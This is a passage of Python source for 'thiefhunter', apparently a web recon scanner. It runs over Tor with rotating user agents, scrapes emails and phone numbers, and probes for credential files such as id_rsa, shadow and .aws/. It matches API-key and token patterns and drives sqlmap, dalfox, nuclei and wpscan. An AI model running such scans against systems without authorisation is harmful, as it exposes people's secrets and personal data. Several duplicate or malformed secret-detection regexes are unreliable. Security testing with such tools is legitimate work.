import argparse, requests, time, re, warnings, tldextract, urllib3, os, difflib, logging, random, threading, signal, sys, subprocess, shlex, pprint, http.client, json, textwrap
import concurrent.futures
from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
from urllib.parse import urlparse, urljoin, parse_qs, parse_qsl, urlencode, urlunparse, quote
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from packaging.version import parse as parse_version, InvalidVersion
from packaging import version
from wappalyzer import analyze

init() # Init colorama


###############################################################################################################
################################################## banner & co ################################################
###############################################################################################################


M = Fore.MAGENTA
W = Fore.WHITE
R = Fore.RED
Y = Fore.YELLOW
G = Fore.GREEN
C = Fore.CYAN


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


banner = rf'''

{C} _   _     _       __ {W} _                 {R} _            
{C}| |_| |__ (_) ___ / _|{W}| |__  _   _ _ __  {R}| |_ ___ _ __ 
{C}| __| '_ \| |/ _ \ |_ {W}| '_ \| | | | '_ \ {R}| __/ _ \ '__|
{C}| |_| | | | |  __/  _|{W}| | | | |_| | | | |{R}| ||  __/ |   
{C} \__|_| |_|_|\___|_|  {W}|_| |_|\__,_|_| |_|{R} \__\___|_|   
                                         {Y}<{C}raphaelthief{Y}>{G}               
'''


###############################################################################################################
################################################# Config & setup ##############################################
###############################################################################################################


# pass 'classics' warnings
warnings.filterwarnings("ignore", category=UserWarning, module="bs4")
warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)


# Logger configuration
logging.basicConfig(level=logging.INFO, format=f'{M}[%(levelname)s] {G}%(message)s')
logger = logging.getLogger(__name__)

# Important HTTP Codes ############# Add more there if needed #############
REDIRECT_CODES = list(range(300, 311))
ERROR_CODES = list(range(400, 411))

# List of potentially dangerous sources/sinks
SOURCES_SINKS = [
    "location.href", "location.hash", "location.search", "location.pathname", "document.URL",
    "window.name", "document.referrer", "document.documentURI", "document.baseURI", "document.cookie",
    "eval", "Function", "setTimeout", "setInterval", "document.write", "document.writeln", "script.src",
    "script.textContent", "xhr.open", "xhr.send", "fetch"
]


tor_proxies = {
    "http": "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050"
}

proxies = {}

verbosity = "no"
user_agents = "no"
seen_status_codes = []
torusage = "no"

def handle_sigint(signal_received, frame):
    print(f"\n{R}[Info] Ctrl+C detected. Stoping ...")
    sys.exit(0) 

signal.signal(signal.SIGINT, handle_sigint)




###############################################################################################################
#################################################### Loaders ##################################################
###############################################################################################################

def check_ips(lanch):
    global torusage, proxies
    error_spoted = "no"
    print(f"{M}[Info] {C}Checking IPs configurations ...{G}")
    
    try:
        
        if torusage == "yes":
            proxies = tor_proxies
        else:
            proxies = proxies
        
        # send request to Tor for checkin
        response = requests.get("https://check.torproject.org/", proxies=proxies, timeout=30)

        if response.status_code == 200:
            if "Congratulations" in response.text:
                print(f"{M}[Info] {G}Tor is correctly setup")
                
                try:
                    url = "http://httpbin.org/ip"
                    response = requests.get(url, proxies=proxies, timeout=30)
                    
                    if response.status_code == 200:
                        #print(f"{M}[Info] {G}Tor ip :", response.json())
                        
                        tor_ip = response.json().get("origin", "Unknown")
                        print(f"{M}[Info] {G}Tor ip : {tor_ip}")                        
                        
                        
                        
                    else:
                        print(f"{M}[Error] {R}Response to {url} : {response.status_code} ")
                        error_spoted = "yes"
                except requests.exceptions.RequestException as e:
                    print(f"{M}[Error] {R}: {e}")
                    error_spoted = "yes"
                
            else:
                print(f"\n{M}[Info] {G}You are not connected to Tor network")
                error_spoted = "yes"
        else:
            print(f"{M}[Error] {R}Response to {url} : {response.status_code}")
            print(f"\n{M}[Info] {G}You are not connected to Tor network")
            error_spoted = "yes"
            
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}: {e}")
        print(f"\n{M}[Info] {G}You are not connected to Tor network")
        error_spoted = "yes"

    try:
        # Command to execute
        command = ["curl", "https://api.ipify.org"]

        # Execute the program
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Retrieve output and errors
        stdout, stderr = process.communicate()

        # Check if an error occurred
        if process.returncode != 0:
            print(f"{M}[Error] {R}: {stderr}")
            error_spoted = "yes"
        else:
            #print(f"{M}[Info] {G}Outgoing ip (--sqlmap, --dalfox, --wpscan and --nuclei): {stdout.strip()}")
            
            outgoing_ip = stdout.strip()
            print(f"{M}[Info] {G}Outgoing ip (--sqlmap, --dalfox, --wpscan and --nuclei): {outgoing_ip}")


        # Verify the outgoing IP with an HTTP request
        try:
            response = requests.get("https://api.ipify.org", proxies=proxies, timeout=5)
            response.raise_for_status()
            #print(f"{M}[Info] {G}Current public ip (thiefhunter) : {response.text}")
            
            public_ip = response.text.strip()
            print(f"{M}[Info] {G}Current public ip (thiefhunter): {public_ip}")
            
            
            
        except requests.RequestException as e:
            print(f"{M}[Error] {R}: {e}")
            error_spoted = "yes"
    except Exception as e:
        print(f"{M}[Error] {R}: {e}")
        error_spoted = "yes"


    if lanch == "no":
        sys.exit()
    else:

        if error_spoted == "yes":
            print(f"{M}[Warning] {R}Errors spotted")
            confirm = input(f"{M}[Info] {G}Exit ? (y/n) : {Y}").strip()
            if confirm.lower() in ['y', 'yes']:
                sys.exit()
        else:
            try:
                if tor_ip != outgoing_ip or tor_ip != public_ip or outgoing_ip != public_ip:
                    print(f"{M}[Warning] {R}The IPs are different")
                    confirm = input(f"{M}[Info] {G}Exit ? (y/n) : {Y}").strip()
                    if confirm.lower() in ['y', 'yes']:
                        sys.exit()                    
                else:
                    print(f"{M}[Success] {G}All IPs are the same : {C}{tor_ip}")
            except Exception as e:
                print(f"{M}[Error] {R}Failed to compare IPs : {e}")
                confirm = input(f"{M}[Info] {G}Exit ? (y/n) : {Y}").strip()
                if confirm.lower() in ['y', 'yes']:
                    sys.exit()
        
    print("\n")



def loadit(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f.readlines()]
        return payloads
    except FileNotFoundError:
        print(f"{M}[Error] {R}File {file_path} not found")
        return []
    except Exception as e:
        print(f"{M}[Error] {R}{e}")
        return []


def parse_cookies(cookie_string):
    # Example implementation : Convert a cookie string into a dictionary
    cookies = {}
    for item in cookie_string.split(";"):
        key, value = item.strip().split("=", 1)
        cookies[key] = value
    return cookies



def check_installation_path(filepath):
    try:
        filepath = os.path.expanduser(filepath)
        subprocess.run([filepath, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return "yes"
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{M}[Error] {Y}'{R}{filepath}{Y}'{R} isn't installed or doesn't exist")
        return "no"


def help_annex():
    
    filepath = loadit("install_paths/sqlmap.txt")

    if isinstance(filepath, list):
        filepath = filepath[0]                


    if filepath is None:
        print(f"{M}[Info] {G}no sqlmap path provided in install_paths/sqlmap.txt")
    else:
        print(f"\n{M}[Info] {G}sqlmap help menu (sqlmap -hh){Y}")
        print(f"-" * 50)
        sqlmap_check = check_installation_path(filepath)
        if sqlmap_check == "yes":
            sqlmap_path_expanded = os.path.expanduser(filepath)
            process = subprocess.Popen([sqlmap_path_expanded, "-hh"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Capture and print output in real-time
            for line in iter(process.stdout.readline, ''):
                print(f"{G}{line.strip()}")
            
            for line in iter(process.stderr.readline, ''):
                print(f"{R}{line.strip()}")
            
            process.stdout.close()
            process.stderr.close()
            process.wait()  


    filepath = loadit("install_paths/dalfox.txt")
    
    if isinstance(filepath, list):
        filepath = filepath[0]              
    
    if filepath is None:
        print(f"{M}[Info] {G}no dalfox path provided in install_paths/dalfox.txt")
    else:
        print(f"\n\n\n{M}[Info] {G}dalfox help menu (dalfox --help){Y}")
        print(f"-" * 50)            
        dalfox_check = check_installation_path(filepath)
        
        
        if dalfox_check == "yes":
            dalfox_path_expanded = os.path.expanduser(filepath)  
            process = subprocess.Popen([dalfox_path_expanded, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Capture and print output in real-time
            for line in iter(process.stdout.readline, ''):
                print(f"{G}{line.strip()}")
            
            for line in iter(process.stderr.readline, ''):
                print(f"{R}{line.strip()}")
            
            process.stdout.close()
            process.stderr.close()
            process.wait()      


    filepath = loadit("install_paths/nuclei.txt")
    
    if isinstance(filepath, list):
        filepath = filepath[0]                  
    
    if filepath is None:
        print(f"{M}[Info] {G}no nuclei path provided in install_paths/nuclei.txt")
    else:
        print(f"\n\n\n{M}[Info] {G}nuclei help menu (nuclei --help){Y}")
        print(f"-" * 50)            
        nuclei_check = check_installation_path(filepath)
        
        
        if nuclei_check == "yes":
            nuclei_path_expanded = os.path.expanduser(filepath)  
            process = subprocess.Popen([nuclei_path_expanded, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Capture and print output in real-time
            for line in iter(process.stdout.readline, ''):
                print(f"{G}{line.strip()}")
            
            for line in iter(process.stderr.readline, ''):
                print(f"{R}{line.strip()}")
            
            process.stdout.close()
            process.stderr.close()
            process.wait()  


    filepath = loadit("install_paths/wpscan.txt")
    
    if isinstance(filepath, list):
        filepath = filepath[0]                 
    
    if filepath is None:
        print(f"{M}[Info] {G}no wpscan path provided in install_paths/wpscan.txt")
    else:
        print(f"\n\n\n{M}[Info] {G}wpscan help menu (wpscan --help){Y}")
        print(f"-" * 50)            
        wpscan_check = check_installation_path(filepath)
        
        
        if wpscan_check == "yes":
            wpscan_path_expanded = os.path.expanduser(filepath)  
            process = subprocess.Popen([wpscan_path_expanded, "--help"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Capture and print output in real-time
            for line in iter(process.stdout.readline, ''):
                print(f"{G}{line.strip()}")
            
            for line in iter(process.stderr.readline, ''):
                print(f"{R}{line.strip()}")
            
            process.stdout.close()
            process.stderr.close()
            process.wait()  



    print(f"\n\n{M}[Info] {G}Default commands (without parameters){Y}")
    print(f"-" * 50) 
    print(f"{M}--url <URL_query> --dalfox{G}")
    print("Dalfox default command will be : 'dalfox URL <URL_query>'")
    print("Note that Dalfox can use a huge amount of CPU resources (buggy) and might shut down your computer inappropriately ...")
    print("It can also overflow server memory with its payloads, leading to DDOS. I recommend using the -w parameter to slow down requests to the server")
    print(f"\n{M}--url <URL_query> -e -w -r --depth 3 --dalfox{G}")
    print("Dalfox default command will be : 'dalfox URL <URL_query>' with a loop on each URL extracted (or normalized with the command --normalize)")
    print(f"\n{M}--file <FILE_query> --dalfox{G}")
    print("Dalfox default command will be the same as --url with a loop on each URL extracted")
    print(f"\n{M}--url <URL_query> --sqlmap{G}")
    print("Sqlmap default command will be : 'sqlmap <URL_query>'")
    print(f"\n{M}--url <URL_query> -e -w -r --depth 3 --sqlmap{G}")
    print("Sqlmap default command will be : 'sqlmap <URL_query> --batch' with a loop on each URL extracted (or normalized with the command --normalize)")
    print(f"\n{M}--file <FILE_query> --sqlmap{G}")
    print("Sqlmap default command will be the same as --url with a loop on each URL extracted")
    print(f"\n{M}--url <URL_query> --nuclei{G}")
    print("nuclei default command will be : 'nuclei <URL_query>'")
    print(f"\n{M}--url <URL_query> -e -w -r --depth 3 --nuclei{G}")
    print("nuclei default command will be : 'nuclei <URL_query>' with a loop on each URL extracted (or normalized with the command --normalize)")
    print(f"\n{M}--file <FILE_query> --nuclei{G}")
    print("nuclei default command will be the same as --url with a loop on each URL extracted")

    print(f"\n\n\n{M}[Info] {G}Tor configuration{Y}")
    print(f"-" * 50) 
    print(f"{M}http  : {G}socks5h://127.0.0.1:9050")
    print(f"{M}https : {G}socks5h://127.0.0.1:9050")
    print(f"\n{M}sqlmap usage : {G}set parameters with --tor --check-tor")
    print(f"\n{M}dalfox usage : {G}set parameters with --proxy socks5h://127.0.0.1:9050")
    print(f"\n{M}nuclei usage : {G}set parameters with --proxy socks5h://127.0.0.1:9050")
    sys.exit()


def check_tor_connection():
    global torusage, proxies

    url = "https://check.torproject.org/"

    print(f"\n{M}[Info] {C}Checking Tor connexion ...{G}")
    try:
     
        response = requests.get(url, proxies=tor_proxies, timeout=30)

        if response.status_code == 200:
            if "Congratulations" in response.text:
                print(f"{M}[Info] {G}Tor is correctly setup")
                torusage = "yes"
            else:
                print(f"\n{M}[Info] {G}You are not connected to Tor network. Stopping thiefhunter ...")
                torusage = "no"
                sys.exit()
        else:
            print(f"{M}[Error] {R}Response to {url} : {response.status_code}")
            print(f"\n{M}[Info] {G}You are not connected to Tor network. Stopping thiefhunter ...")
            torusage = "no"
            sys.exit()
            
            
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}: {e}")
        print(f"\n{M}[Info] {G}You are not connected to Tor network. Stopping thiefhunter ...")
        torusage = "no"
        sys.exit()
        
        
    try:
        url = "http://httpbin.org/ip"
        response = requests.get(url, proxies=tor_proxies, timeout=30)
        
        if response.status_code == 200:
            print(f"{M}[Info] {G}Tor ip :", response.json())
        else:
            print(f"{M}[Error] {R}Response to {url} : {response.status_code} ")
    
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}: {e}")


def proxie_setup(proxie):
    global proxies
    proxies = {
        "http": f"{proxie}",
        "https": f"{proxie}"
    }    
    

###############################################################################################################
############################################ Extract sensitive infos ##########################################
###############################################################################################################
def extract_emails(html):
    """Extracts email addresses from an HTML page"""
    return set(re.findall(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+', html))


def extract_french_phone_numbers(html):
    """Extracts all valid French phone numbers from an HTML page"""
    pattern = re.compile(r"""
        (?:\+33|0033)               # Country code for France (prefixes +33 or 0033)
        [\s.-]?                     
        (?:0?[1-9])                 
        (?:[\s.-]?\d{2}){4}         
        |
        0[1-9]                      
        (?:[\s.-]?\d{2}){4}         
        |
        \d{10}                      
    """, re.VERBOSE)

    found_numbers = re.findall(pattern, html)
    valid_numbers = [num for num in found_numbers if not re.match(r"^\d{8,}$", num)]
    valid_numbers = [num for num in valid_numbers if not re.search(r'[-.].*[-.]', num)]
    return set(valid_numbers)


def extract_sensitive_urls(html):
    """Extracts sensitive files and paths"""
    sensitive_patterns = [
        r'(?:/|\\|\b)(\.env)',
        r'(?:/|\\|\b)(config\.php)',
        r'(?:/|\\|\b)(wp-config\.php)',
        r'(?:/|\\|\b)(database\.yml)',
        r'(?:/|\\|\b)(settings\.py)',
        r'(?:/|\\|\b)(\.git)',
        r'(?:/|\\|\b)(\.htaccess)',
        r'(?:/|\\|\b)(phpinfo\.php)',
        r'(?:/|\\|\b)(dump\.sql)',
        r'(?:/|\\|\b)(backup)',
        r'(?:/|\\|\b)(admin)',
        r'(?:/|\\|\b)(\.bash_history)',  
        r'(?:/|\\|\b)(\.ssh/)',  
        r'(?:/|\\|\b)(id_rsa)',  
        r'(?:/|\\|\b)(id_rsa\.pub)',  
        r'(?:/|\\|\b)(authorized_keys)',  
        r'(?:/|\\|\b)(known_hosts)',  
        r'(?:/|\\|\b)(passwd)',  
        r'(?:/|\\|\b)(shadow)',  
        r'(?:/|\\|\b)(credentials)',  
        r'(?:/|\\|\b)(secrets\.json)',  
        r'(?:/|\\|\b)(apikeys\.txt)',  
        r'(?:/|\\|\b)(config\.ini)',  
        r'(?:/|\\|\b)(web\.config)',  
        r'(?:/|\\|\b)(docker-compose\.yml)',  
        r'(?:/|\\|\b)(\.dockercfg)',  
        r'(?:/|\\|\b)(.npmrc)',  
        r'(?:/|\\|\b)(.composer/auth.json)',  
        r'(?:/|\\|\b)(server\.key)',  
        r'(?:/|\\|\b)(server\.crt)',  
        r'(?:/|\\|\b)(private\.key)',  
        r'(?:/|\\|\b)(ssl-cert\.pem)',  
        r'(?:/|\\|\b)(.aws/)',  
        r'(?:/|\\|\b)(.azure/)',  
        r'(?:/|\\|\b)(.gcloud/)',  
        r'(?:/|\\|\b)(terraform\.tfstate)',  
        r'(?:/|\\|\b)(kubeconfig)',  
        r'(?:/|\\|\b)(.htpasswd)',  
        r'(?:/|\\|\b)(logs/)',  
        r'(?:/|\\|\b)(debug\.log)',  
        r'(?:/|\\|\b)(error\.log)',  
        r'(?:/|\\|\b)(access\.log)',  
        r'(?:/|\\|\b)(node_modules/)',  
        r'(?:/|\\|\b)(vendor/)', 
    ]

    matches = set()
    for pattern in sensitive_patterns:
        found = re.findall(pattern, html, re.IGNORECASE)
        for path in found:
            if not path.startswith(("http", "https")):
                full_url = path
                matches.add(full_url)
    return matches


def extract_source_code_urls(html):
    """Detect links to source code repositories (GitHub, GitLab, Bitbucket, etc.)."""
    source_patterns = [
        r'https?://github\.com/[A-Za-z0-9_-]+/[A-Za-z0-9._-]+',
        r'https?://github\.io/[A-Za-z0-9_-]+/[A-Za-z0-9._-]+',
        r'https?://gitlab\.com/[A-Za-z0-9_-]+/[A-Za-z0-9._-]+',
        r'https?://bitbucket\.org/[A-Za-z0-9_-]+/[A-Za-z0-9._-]+',
        r'https?://gist\.github\.com/[A-Za-z0-9_-]+/[A-Za-z0-9]+',
        r'https?://pastebin\.com/[A-Za-z0-9]+',
        r'https?://sourceforge\.net/projects/[A-Za-z0-9_-]+',
        
        # APIs GraphQL
        r'https?://.*\.graphql\.com.*',
        r'https?://.*\.graphql\.org.*',
        r'https?://.*\.hasura\.io.*',
        r'https?://.*\.apollo\.graph.*',
        r'https?://.*\.graphqlhub\.berkeley.edu.*',
        r'https?://.*\.prisma\.io.*',
        r'https?://.*\.shopify\.com.*graphql.*',
        r'https?://.*\.api.*graphql.*',
        r'https?://.*\.dev/api.*graphql.*',
        r'https?://.*\.com/api.*graphql.*',

        # Generic API calls (ex: fetch, axios, XMLHttpRequest, curl, etc.)
        r'https?://[a-zA-Z0-9.-]+/api/[a-zA-Z0-9/_-]+',
        r'https?://[a-zA-Z0-9.-]+/graphql',
        r'https?://[a-zA-Z0-9.-]+/v[0-9]+/.*',  # Versioning API ex: /v1/, /v2/
        
        # API calls in AJAX, Fetch, or other XHR requests
        r'fetch\(["\'](https?://[a-zA-Z0-9.-]+/.*?)[\?"\']',
        r'axios\.(get|post|put|delete|patch)\(["\'](https?://[a-zA-Z0-9.-]+/.*?)[\?"\']',
        r'XMLHttpRequest\(\)\.open\(["\'](GET|POST|PUT|DELETE|PATCH)["\'],\s*["\'](https?://[a-zA-Z0-9.-]+/.*?)[\?"\']',
        r'\$.ajax\({\s*url:\s*["\'](https?://[a-zA-Z0-9.-]+/.*?)[\?"\']',

        # API specific to well-known platforms
        r'https?://api\.github\.com/.*',  
        r'https?://gitlab\.com/api/.*',  
        r'https?://bitbucket\.org/api/.*',
        r'https?://api\.slack\.com/.*',
        r'https?://api\.discord\.com/.*',
        r'https?://api\.stripe\.com/.*',
        r'https?://api\.paypal\.com/.*',
        r'https?://graph\.facebook\.com/.*',
        r'https?://graph\.instagram\.com/.*',
        r'https?://api\.twitter\.com/.*',
        r'https?://api\.twitch\.tv/.*',
        r'https?://api\.youtube\.com/.*',
        r'https?://api\.openweathermap\.org/.*',
        r'https?://api\.dropbox\.com/.*',
        r'https?://api\.shopify\.com/.*',
        r'https?://api\.googleapis\.com/.*',
        r'https?://maps\.googleapis\.com/.*',
        r'https?://api\.microsoft\.com/.*',
        r'https?://graph\.microsoft\.com/.*',
        r'https?://api\.telegram\.org/.*',
        r'https?://api\.notion\.com/.*',
        r'https?://api\.airtable\.com/.*',

        # Generic GraphQL entry points
        r'https?://.*?/graphql',
        r'https?://.*?/api/graphql',
        r'https?://.*?/v[0-9]+/graphql',

        # Internal API entry points (if they follow a certain pattern)
        r'https?://[a-zA-Z0-9.-]+/internal_api/.*',
        r'https?://[a-zA-Z0-9.-]+/private_api/.*',
        r'https?://[a-zA-Z0-9.-]+/admin_api/.*',
    ]

    matches = set()
    for pattern in source_patterns:
        matches.update(re.findall(pattern, html, re.IGNORECASE))
    
    return matches


def extract_sensitive_data(html):
    """Detects API keys, tokens, credentials, and other sensitive information"""
    sensitive_patterns = {
        # AWS Keys: Should be surrounded by spaces or quotes
        "AWS Access Key": r'(?i)(?:"|\b|=)(AKIA[0-9A-Z]{16})(?=\b|")',
        
        # Google API Key: A valid key starts with 'AIza' and follows a specific structure
        "Google API Key": r'(?i)(?:"|\b|=)(AIza[0-9A-Za-z-_]{35})(?=\b|")',
        
        # GitHub Token: Prefixed with 'ghp_' and 36 characters long
        "GitHub Token": r'(?i)(?:"|\b|=)(ghp_[0-9a-zA-Z]{36})(?=\b|")',
        "GitHub Token": r'(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9_]{36}',
        
        # Gitlab Token
        "Gitlab Token": r'(glpat|gldt|glft|glsoat|glrt)-',
        "Gitlab Token": r'[A-Za-z0-9_\-]{20,50}(?!\w)',
        "Gitlab Token": r'GR1348941[A-Za-z0-9_\-]{20,50}(?!\w))',
        "Gitlab Token": r'glcbt-([0-9a-fA-F]{2}_)?[A-Za-z0-9_\-]{20,50}(?!\w)', # CI/CD Token - `glcbt` or `glcbt-XY_` where XY is a 2-char hex 'partition_id'
        "Gitlab Token": r'glimt-[A-Za-z0-9_\-]{25}(?!\w)',  # Incoming Mail Token - generated by SecureRandom.hex, default length 16 bytes
        "Gitlab Token": r'glptt-[A-Za-z0-9_\-]{40}(?!\w)', # Trigger Token - generated by `SecureRandom.hex(20)`
        "Gitlab Token": r'glagent-[A-Za-z0-9_\-]{50,1024}(?!\w)', # Agent Token - generated by `Devise.friendly_token(50)`
        "Gitlab Token": r'gloas-[A-Za-z0-9_\-]{64}(?!\w)', # GitLab OAuth Application Secret - generated by `SecureRandom.hex(32)`
        
        # Discord Token
        "Gitlab Token": r'[MNO][a-zA-Z\d_-]{23,25}\.[a-zA-Z\d_-]{6}\.[a-zA-Z\d_-]{27}',
        
        # Slack Token : Type "xoxb-", "xoxp-", "xoxa-", "xoxr-"
        "Slack Token": r'(?i)(?:"|\b|=)(xox[baprs]-[0-9A-Za-z]{10,48})(?=\b|")',
        
        # Discord Token : JWT format
        "Discord Token": r'(?i)(?:"|\b|=)([MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27})(?=\b|")',
        
        # Stripe API Key : Commence par 'sk_live_' followed by 24 characters
        "Stripe API Key": r'(?i)(?:"|\b|=)(sk_live_[0-9a-zA-Z]{24})(?=\b|")',
        
        # JWT Tokens : 3 segments separated by dots, must be surrounded by a clear context
        "JWT Token": r'(?i)(?:"|\b|=)(eyJ[A-Za-z0-9_-]+(?:\.[A-Za-z0-9_-]+){2}\.[A-Za-z0-9_-]+)(?=\b|")',
        
        # Private Key : Must appear with a well-defined tag
        "Private Key": r'(?i)(-----BEGIN (?:RSA|DSA|EC|PGP|OPENSSH) PRIVATE KEY-----[\s\S]+?-----END (?:RSA|DSA|EC|PGP|OPENSSH) PRIVATE KEY-----)',
        
        # Password in URL : Must be preceded by "password=" to be valid
        "Password in URL": r'(?i)(?:"|\b|=)(password=[^&\s]+)(?=\b|")',
        
        # Detection of CSRF tokens in a <meta> tag
        "CSRF Token": r'(?i)<meta\s+name=["\']csrf-token["\']\s+content=["\']([a-zA-Z0-9\-_]+)["\']\s*/?>',
        
        # Generic detection of sensitive keywords (e.g., api_key="...", token="...", secret="...")
        "Generic Sensitive Keyword": r'(?i)(?:"|\b|=)(?:api[_-]?key|secret|token|auth[_-]?key|access[_-]?key|bearer)["\']?\s*[:=]\s*["\']?([a-zA-Z0-9\-_]{16,64})(?=\b|")'
    }
    
    found_data = {}
    for label, pattern in sensitive_patterns.items():
        try:
            # Use re.DOTALL to handle multiline patterns and re.IGNORECASE for case-insensitivity
            matches = re.findall(pattern, html, re.IGNORECASE | re.DOTALL)
            if matches:
                found_data[label] = matches
        except re.error as e:
            print(f"[!] Error with pattern for {label} : {e}")
    return found_data


def extract_sensitive_comments(html):
    """Extract HTML comments containing sensitive keywords along with their respective lines"""
    lines = html.split("\n")
    sensitive_comments = []

    keywords = [
        # EN
        'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey', 
        'auth', 'authorization', 'bearer', 'jwt', 'access_token', 'refresh_token',
        'sessionid', 'session_id', 'client_secret', 'client_id', 'private_key',
        'public_key', 'ssh_key', 'oauth', 'oauth_token', 'aws_access_key',
        'aws_secret_key', 'google_api_key', 'firebase_api_key', 'stripe_api_key',
        'github_token', 'gitlab_token', 'slack_token', 'discord_token', 
        'webhook', 'credentials', 'database_url', 'db_password', 'db_user',
        'smtp_password', 'smtp_user', 'ftp_password', 'ftp_user', 'proxy_password',
        'proxy_user', 'encryption_key', 'crypt_key', 'master_key', 
        'root_password', 'admin_password', 'superuser', 'keystore', 'hmac_key',
        
        # FR
        'motdepasse', 'mdp', 'clé_secrète', 'clé_api', 'clé_privée', 
        'clé_publique', 'authentification', 'autorisation', 'jeton', 
        'clé_cryptage', 'clé_chiffrement', 'secret_partagé', 'secret_key',
        'mot_de_passe_admin', 'mot_de_passe_root', 'base_de_données',
        'utilisateur_bd', 'mot_de_passe_bd', 'mot_de_passe_ftp', 'utilisateur_ftp',
        'mot_de_passe_proxy', 'utilisateur_proxy', 'clé_stockage', 'clé_api_google',
        'clé_api_aws', 'clé_api_firebase', 'jeton_session', 'clé_api_stripe',
        'jeton_github', 'jeton_gitlab', 'jeton_slack', 'jeton_discord',
        'url_base_donnees', 'mot_de_passe_smtp', 'utilisateur_smtp'
    ]

    for i, line in enumerate(lines, start=1):
        comments = re.findall(r'<!--(.*?)-->', line, re.DOTALL)
        for comment in comments:
            if any(kw in comment.lower() for kw in keywords):
                sensitive_comments.append((i, comment.strip()))
    return sensitive_comments


def extract_keywords(html):
    """Extract sensitive keywords and list all the lines where they appear"""
    lines = html.split("\n")
    keyword_matches = {}

    keywords = [
        'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey', 
        'auth', 'authorization', 'bearer', 'jwt', 'access_token', 'refresh_token',
        'client_secret', 'client_id', 'private_key', 'public_key', 'ssh_key',
        'oauth', 'oauth_token', 'aws_access_key', 'aws_secret_key', 
        'google_api_key', 'firebase_api_key', 'stripe_api_key', 'github_token',
        'gitlab_token', 'slack_token', 'discord_token', 'webhook', 'credentials',
        'database_url', 'db_password', 'db_user', 'smtp_password', 'smtp_user',
        'ftp_password', 'ftp_user', 'proxy_password', 'proxy_user', 'encryption_key',
        'crypt_key', 'master_key', 'root_password', 'admin_password', 'superuser',
        'keystore', 'hmac_key'
    ]

    for i, line in enumerate(lines, start=1):
        for keyword in keywords:
            if keyword in line.lower():
                if keyword not in keyword_matches:
                    keyword_matches[keyword] = []
                keyword_matches[keyword].append(i)
    return keyword_matches


def check_url_exists(url):
    """Check if a URL exists by sending a HEAD request"""
    try:
        response = requests.head(url, timeout=5, allow_redirects=True)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


def process_page(url):
    """Download and analyze a page to extract emails, phone numbers, sensitive files, and confidential information"""
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            html_content = response.text
            
            emails = extract_emails(html_content)
            for email in emails:
                print(f"{G}[+] {Y}Found email : {G}{email}")

            phones = extract_french_phone_numbers(html_content)
            for phone in phones:
                print(f"{G}[+] {Y}Found phone number : {G}{phone}")

            sensitive_urls = extract_sensitive_urls(html_content)
            for sensitive_url in sensitive_urls:
                if check_url_exists(urljoin(url, sensitive_url)):
                    print(f"{G}[🔗] {Y}Accessible sensitive URL found : {G}{urljoin(url, sensitive_url)}")

            source_code_urls = extract_source_code_urls(html_content)
            for source_url in source_code_urls:
                print(f"{G}[🔗] {Y}Found interesting link : {G}{source_url}")

            sensitive_data = extract_sensitive_data(html_content)
            for label, values in sensitive_data.items():
                for value in values:
                    print(f"{G}[!] {Y}Found {C}{label} {Y}: {G}{value}")

            keywords_found = extract_keywords(html_content)
            for keyword, lines in keywords_found.items():
                print(f"{G}[Keyword] {Y}'{C}{keyword}{Y}' found at lines : {G}{', '.join(map(str, lines))}")

            comments = extract_sensitive_comments(html_content)
            for comment in comments:
                print(f"{G}[+] {Y}Sensitive comment found : {G}{comment}")
            return emails, phones, sensitive_urls, source_code_urls, sensitive_data
    except requests.exceptions.RequestException as e:
        print(f"{M}[!] {R}Error processing {url} : {e}")
        
    return set(), set(), set(), set(), {}


###############################################################################################################
############################################## Scan urls / domains ############################################
###############################################################################################################
def fetch_pagelinks(url, cookies):
    global proxies, display_count 
    
    try:
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }        
        else:
            headers = None

        cookies = cookies or {}        
        
        if torusage == "yes":
            proxies = tor_proxies

        api_url = f"https://api.hackertarget.com/pagelinks/?q={url}"

        response = requests.get(api_url, headers=headers, cookies=cookies, timeout=10)  # Timeout de 10 secondes
        response.encoding = 'utf-8' 
        lines = response.text.strip().split("\n")
        line_count = len(lines)
        
        for line in lines:
            print(f"{M}[api_crawl] {G}{line}")

        return line_count
        
        
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Could not fetch https://api.hackertarget.com/pagelinks/?q={url}: {e}")
        

def fetch_page(url, cookies):
    global proxies
    
    try:    
        if user_agents == "yes":
            headersX = loadit("payloads/user_agents.txt")
            headers = {
                "User-Agent": random.choice(headersX)
            }        
        else:
            headers = None

        cookies = cookies or {}        
        
        if torusage == "yes":
            proxies = tor_proxies

        
        response = requests.get(url, headers=headers, proxies=proxies, cookies=cookies, timeout=10)
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"{M}[Error] {R}Could not fetch {url}: {e}")
        return ""


def extract_links(domain, page_content):
    """Extract all links from the HTML content."""
    soup = BeautifulSoup(page_content, 'html.parser')
    links = set()

    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        full_url = urljoin(domain, href)
        parsed = urlparse(full_url)

        # Filter for same-domain links only
        if parsed.netloc == urlparse(domain).netloc:
